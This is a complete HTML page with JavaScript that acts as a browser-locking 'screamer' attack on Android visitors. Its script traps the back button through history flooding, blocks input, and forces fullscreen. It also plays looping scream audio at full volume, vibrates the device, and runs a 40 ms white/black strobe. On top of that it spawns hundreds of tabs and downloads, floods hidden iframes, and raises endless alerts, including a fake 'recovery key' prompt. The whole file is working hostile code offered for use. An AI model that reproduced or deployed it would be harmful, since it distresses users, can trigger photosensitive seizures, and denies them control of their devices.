<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
    <title>⚠️</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            touch-action: none;
        }
        body {
            background: black;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
        }
        .strobe-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 99999;
            background: white;
        }
        .noise-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 99998;
        }
        button {
            position: absolute;
            bottom: -100px;
        }
    </style>
</head>
<body>
    <canvas id="noiseCanvas" class="noise-canvas"></canvas>
    
    <script>
    (function() {
        // ==================== BLOQUEO EXTREMO PARA ANDROID ====================
        // Bloquear botón atrás (Android)
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
        
        // Historial infinito para bloquear back button
        for (let i = 0; i < 500; i++) {
            history.pushState({ i: i }, '', '#lock' + i);
        }
        
        window.addEventListener('popstate', function() {
            for (let i = 0; i < 100; i++) {
                history.pushState({}, '', '#block' + Math.random());
            }
            // Forzar recarga si intentan salir
            location.reload();
        });
        
        setInterval(() => {
            history.pushState({}, '', '#hijack');
        }, 50);
        
        // Deshabilitar todos los gestos táctiles
        document.body.style.touchAction = 'none';
        document.body.style.overscrollBehavior = 'none';
        
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
        
        document.addEventListener('touchstart', function(e) {
            e.preventDefault();
        }, { passive: false });
        
        // Bloquear teclado (botones físicos virtuales)
        document.addEventListener('keydown', function(e) {
            e.preventDefault();
            return false;
        });
        
        // Bloquear menú contextual
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        // ==================== AUDIO FORZADO PARA ANDROID ====================
        // Android requiere interacción de usuario para AudioContext
        // Vamos a crear el audio Y FORZAR reproducción en el primer toque
        
        let audioStarted = false;
        let audioSources = [];
        let gainNode = null;
        let audioCtx = null;
        
        function initAudio() {
            if (audioStarted) return;
            audioStarted = true;
            
            try {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                gainNode = audioCtx.createGain();
                gainNode.gain.value = 1.0;
                gainNode.connect(audioCtx.destination);
                
                // Función para crear scream buffer
                function createScreamBuffer(freqBase, callback) {
                    const sampleRate = audioCtx.sampleRate;
                    const length = sampleRate * 3;
                    const buffer = audioCtx.createBuffer(1, length, sampleRate);
                    const data = buffer.getChannelData(0);
                    for (let i = 0; i < length; i++) {
                        let t = i / sampleRate;
                        let scream = 0;
                        // Grito humano agudo + distorsión
                        scream += Math.sin(t * (freqBase + Math.sin(t * 80) * 200)) * 0.7;
                        scream += Math.sin(t * (freqBase * 1.5)) * 0.4;
                        scream += Math.sin(t * (freqBase * 2.2)) * 0.3;
                        scream += Math.random() * 0.6;
                        scream += Math.sin(t * 40) * 0.2;
                        // Limitar
                        scream = Math.min(0.9, Math.max(-0.9, scream));
                        data[i] = scream;
                    }
                    callback(buffer);
                }
                
                const buffers = [];
                const freqs = [780, 850, 920, 1100, 650, 1300, 700, 1600, 890, 1950];
                let loaded = 0;
                
                freqs.forEach((freq, idx) => {
                    createScreamBuffer(freq, function(buffer) {
                        buffers[idx] = buffer;
                        loaded++;
                        if (loaded === freqs.length) {
                            // Reproducir todos los screamers en loop
                            for (let b = 0; b < buffers.length; b++) {
                                const source = audioCtx.createBufferSource();
                                source.buffer = buffers[b];
                                source.connect(gainNode);
                                source.loop = true;
                                source.start();
                                audioSources.push(source);
                            }
                            
                            // Screamers adicionales superpuestos
                            setInterval(() => {
                                if (buffers.length > 0 && audioCtx.state === 'running') {
                                    const randomBuf = buffers[Math.floor(Math.random() * buffers.length)];
                                    const extra = audioCtx.createBufferSource();
                                    extra.buffer = randomBuf;
                                    extra.connect(gainNode);
                                    extra.start();
                                    audioSources.push(extra);
                                }
                                if (gainNode && gainNode.gain.value < 1.0) gainNode.gain.value = 1.0;
                            }, 200);
                        }
                    });
                });
                
                // Forzar volumen máximo cada 100ms
                setInterval(() => {
                    if (gainNode && gainNode.gain) gainNode.gain.value = 1.0;
                }, 100);
                
                audioCtx.resume();
                
            } catch(e) {
                console.log("Audio error:", e);
            }
        }
        
        // ==================== VIBRACIÓN FORZADA PARA ANDROID ====================
        function vibrateIntense() {
            if (navigator.vibrate) {
                navigator.vibrate([800, 300, 800, 300, 1500, 500, 1000, 400]);
            }
            // Intentar nuevamente si falla
            setTimeout(() => {
                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
            }, 100);
        }
        
        function startVibrationLoop() {
            vibrateIntense();
            setInterval(() => {
                vibrateIntense();
            }, 700);
        }
        
        // ==================== STROBO BLANCO/NEGRO EXTREMO ====================
        let strobeActive = true;
        function startStrobe() {
            const strobeDiv = document.createElement('div');
            strobeDiv.className = 'strobe-layer';
            document.body.appendChild(strobeDiv);
            
            let white = true;
            setInterval(() => {
                if (strobeActive) {
                    strobeDiv.style.background = white ? 'white' : 'black';
                    strobeDiv.style.opacity = white ? '0.95' : '0.9';
                    white = !white;
                }
            }, 40);
        }
        
        // ==================== RUIDO EN PANTALLA + SHAKE ====================
        const canvas = document.getElementById('noiseCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        let shakeIntensity = 0;
        function drawNoiseAndShake() {
            if (!ctx) return;
            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imgData.data;
            for (let i = 0; i < data.length; i += 4) {
                const val = Math.random() * 255;
                data[i] = val;
                data[i+1] = val;
                data[i+2] = val;
                data[i+3] = 255;
            }
            ctx.putImageData(imgData, 0, 0);
            
            // Shake violento
            const shakeX = (Math.random() - 0.5) * 25;
            const shakeY = (Math.random() - 0.5) * 25;
            document.body.style.transform = `translate(${shakeX}px, ${shakeY}px)`;
            
            requestAnimationFrame(drawNoiseAndShake);
        }
        drawNoiseAndShake();
        
        // ==================== PESTAÑAS + DESCARGAS MASIVAS ====================
        function openMassiveTabs() {
            const urls = [
                'https://httpbin.org/bytes/2097152',
                'https://httpbin.org/bytes/1048576',
                'https://httpbin.org/delay/1?bytes=500000',
                'about:blank#x',
                'about:blank#y',
                'data:application/octet-stream;base64,UEsDBAoAAAAAIAZ0VwAAAAAAAAAAAAAAAAkAAAA8P3h1eHh4eA=='
            ];
            
            function openOne(url, delay) {
                setTimeout(() => {
                    const w = window.open(url, '_blank');
                    if (!w || w.closed) {
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'file_' + Date.now() + '.bin';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    }
                }, delay);
            }
            
            // 200 pestañas iniciales
            for (let i = 0; i < 200; i++) {
                openOne(urls[i % urls.length], i * 30);
            }
            
            // Continuar abriendo
            setInterval(() => {
                for (let i = 0; i < 15; i++) {
                    const url = urls[Math.floor(Math.random() * urls.length)];
                    const w = window.open(url, '_blank');
                    if (!w) {
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'spam_' + Date.now() + '.bin';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    }
                }
            }, 600);
        }
        
        // ==================== IFRAME FLOOD ====================
        function iframeFlood() {
            setInterval(() => {
                for (let f = 0; f < 30; f++) {
                    const ifr = document.createElement('iframe');
                    ifr.src = 'https://httpbin.org/bytes/300000';
                    ifr.style.display = 'none';
                    document.body.appendChild(ifr);
                    setTimeout(() => ifr.remove(), 500);
                }
            }, 400);
        }
        
        // ==================== ALERTAS INFINITAS (BLOQUEO TOTAL) ====================
        function infiniteAlerts() {
            setInterval(() => {
                alert('⚠️ ERROR FATAL ⚠️\n\nCódigo: DEADBEEF');
            }, 300);
            setInterval(() => {
                confirm('Sistema dañado. Pulse OK para continuar...');
            }, 400);
            setInterval(() => {
                prompt('Clave de recuperación:', '');
            }, 500);
        }
        
        // ==================== FULLSCREEN FORZADO ====================
        function forceFullscreen() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }
        }
        setInterval(forceFullscreen, 200);
        
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) forceFullscreen();
        });
        
        // ==================== BLOQUEAR VISIBILIDAD (que no salga al cambiar pestaña) ====================
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                // Si vuelve a la pestaña, refuerza todo
                location.reload();
            }
        });
        
        // ==================== DETECTAR TOQUE Y ACTIVAR TODO ====================
        let hellStarted = false;
        
        function startHell() {
            if (hellStarted) return;
            hellStarted = true;
            
            // Iniciar audio FORZADO por interacción de usuario (requisito Android)
            initAudio();
            
            // Iniciar vibración
            startVibrationLoop();
            
            // Iniciar strobo
            startStrobe();
            
            // Abrir pestañas
            openMassiveTabs();
            
            // Iframe flood
            iframeFlood();
            
            // Alertas infinitas
            infiniteAlerts();
            
            // Fullscreen
            forceFullscreen();
            
            // Congelar CPU extra
            setInterval(() => {
                let x = 0;
                for (let i = 0; i < 30000; i++) x += Math.sin(i);
            }, 8);
        }
        
        // Activar con cualquier toque
        document.body.addEventListener('touchstart', startHell);
        document.body.addEventListener('click', startHell);
        
        // Auto-intento después de 1 segundo (por si el usuario no toca)
        setTimeout(() => {
            if (!hellStarted) {
                // Simular toque programáticamente (no funciona para audio en Android, pero igual)
                startHell();
            }
        }, 1000);
        
        // Mantener posición fixed
        document.body.style.position = 'fixed';
        document.body.style.top = '0';
        document.body.style.left = '0';
        
        // Prevenir cualquier intento de salida con botón home virtual (no se puede, pero bloqueamos lo posible)
        window.onblur = function() {
            setTimeout(() => {
                window.focus();
                location.reload();
            }, 50);
        };
        
        console.log("Cargado - esperando toque en pantalla");
    })();
    </script>
</body>
</html>
